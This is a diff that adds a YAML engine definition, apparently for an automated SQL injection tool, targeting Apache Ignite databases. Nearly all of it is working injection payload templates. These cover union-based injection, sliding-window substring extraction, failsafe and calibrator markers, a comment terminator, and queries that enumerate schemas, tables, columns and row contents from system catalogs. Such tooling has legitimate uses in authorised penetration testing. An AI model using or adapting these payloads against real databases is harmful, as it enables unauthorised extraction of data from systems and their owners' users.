@@ -1,0 +1,136 @@
+engine: Ignite
+
+resource: 
+ info: |
+  'ignite_version'
+  || '${enclose_value_sql}'
+  || 'ignite_database'
+  || '${enclose_value_sql}'
+  || 'ignite_user'
+  || '${trail_sql}'
+
+ schema:
+  database: |
+   select
+       group_concat(
+           r separator
+           '${separator_cell_sql}'
+       )
+       || '${trail_sql}'
+   from (
+       select
+           '${enclose_value_sql}'
+           || name
+           || '${separator_qte_sql}'
+           || 0
+           || '${enclose_value_sql}'
+           r
+       from sys.schemas
+       order by r
+       ${limit}
+   ) x
+
+  table: |
+   select
+       group_concat(
+           r separator
+           '${separator_cell_sql}'
+       )
+       || '${trail_sql}'
+   from (
+       select
+           '${enclose_value_sql}'
+           || table_name
+           || '${separator_qte_sql}'
+           || 0
+           || '${enclose_value_sql}'
+           r
+       from sys.tables t
+       where t.schema_name = '${database}'
+       order by r
+       ${limit}
+   ) x
+
+  column: |
+   select
+       group_concat(
+           r separator
+           '${separator_cell_sql}'
+       )
+       || '${trail_sql}'
+   from (
+       select
+           '${enclose_value_sql}'
+           || column_name
+           || '${separator_qte_sql}'
+           || 0
+           || '${enclose_value_sql}'
+           r
+       from sys.table_columns t
+       where t.schema_name = '${database}'
+       and t.table_name = '${table}'
+       order by r
+       ${limit}
+   ) x
+
+  row:
+   query: |
+    select
+        group_concat(
+            r separator
+            '${separator_cell_sql}'
+        )
+        || '${trail_sql}'
+    from (
+        select distinct
+            '${enclose_value_sql}'
+            || ${fields}
+            || '${separator_qte_sql}'
+            || 0
+            || '${enclose_value_sql}'
+            r
+        from ${database}.${table}
+        order by r
+        ${limit}
+    ) x    
+   fields:
+    field: ${field.value}
+    concat: "||'%7f'||"
+
+strategy:
+ configuration:
+  slidingWindow: |
+   (
+       select
+           concat(
+               '${lead}',
+               substr(
+                   (${injection}),
+                   ${window.char},
+                   ${capacity}
+               )
+           )
+   )
+  limit: limit ${limit.value}, 65536
+  failsafe: 1337${indice}7330%2b1
+  calibrator: repeat('${calibrator_sql}', 65565)
+  limitBoundary: 0
+  endingComment: --+-
+  fingerprint:
+   errorMessage:
+    - Ignite
+
+ union:
+  indices: union select ${indices}
+  capacity: |
+   (
+       select
+           '${lead}'
+           || ${indice}
+           || ${calibrator}
+   )
+  orderBy: order by 1337
+
+ # binary:
+ # BITAND( BIT'11111111', BIT'10101010' ) requires type bit
+ # impossible to convert ascii('a') to bit
